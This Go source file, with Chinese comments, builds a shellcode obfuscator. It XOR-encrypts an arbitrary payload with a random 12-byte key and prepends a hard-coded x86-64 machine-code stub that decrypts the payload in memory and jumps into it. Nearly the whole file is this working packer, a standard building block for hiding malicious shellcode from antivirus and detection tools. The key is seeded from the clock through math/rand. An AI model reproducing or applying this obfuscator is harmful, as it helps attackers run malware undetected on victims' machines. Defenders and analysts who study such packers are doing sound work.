package main

import (
	"bytes"
	"encoding/binary"
	"math/rand"
	"time"
)

// 生成随机密钥
func GenRandomKey() []byte {
	rand.Seed(time.Now().UnixNano())
	key := make([]byte, 12)
	rand.Read(key)
	return key
}

// 使用密钥对payload进行加密
func XorEncrypt(payload []byte, key []byte) []byte {
	var xored_payload []byte
	for i := 0; i < len(payload); i++ {
		xored_payload = append(xored_payload, payload[i]^key[i%len(key)])
	}
	return xored_payload
}

// 生成解密器
func MakeDecryptor(payload []byte, key []byte) []byte {
	prefix := []byte{0x4C, 0x8D, 0x1D, 0x3D, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x4D, 0x8D, 0x43, 0x0D, 0x4D, 0x8B, 0xD0, 0xB8, 0xAB, 0xAA, 0xAA, 0xAA, 0x41, 0xF7, 0xE1, 0x41, 0x8B, 0xC1, 0x41, 0xFF, 0xC1, 0xC1, 0xEA, 0x03, 0x8D, 0x0C, 0x52, 0xC1, 0xE1, 0x02, 0x2B, 0xC1, 0x42, 0x8A, 0x44, 0x18, 0x01, 0x41, 0x30, 0x02, 0x49, 0xFF, 0xC2, 0x41, 0x81, 0xF9}
	suffix := []byte{0x72, 0xD3, 0x49, 0xFF, 0xE0, 0xCC, 0xCC, 0xCC, 0xC2}
	size := int32(len(payload))
	bytesBuffer := bytes.NewBuffer([]byte{})
	binary.Write(bytesBuffer, binary.LittleEndian, size)
	decryptor := append(append(prefix, bytesBuffer.Bytes()...), suffix...)
	return decryptor
}

func obfuscate(sc []byte) []byte {
	key := GenRandomKey()
	xored_payload := XorEncrypt(sc, key)
	decryptor := MakeDecryptor(sc, key)
	shellcode := append(append(decryptor, key...), xored_payload...)
	return shellcode
}
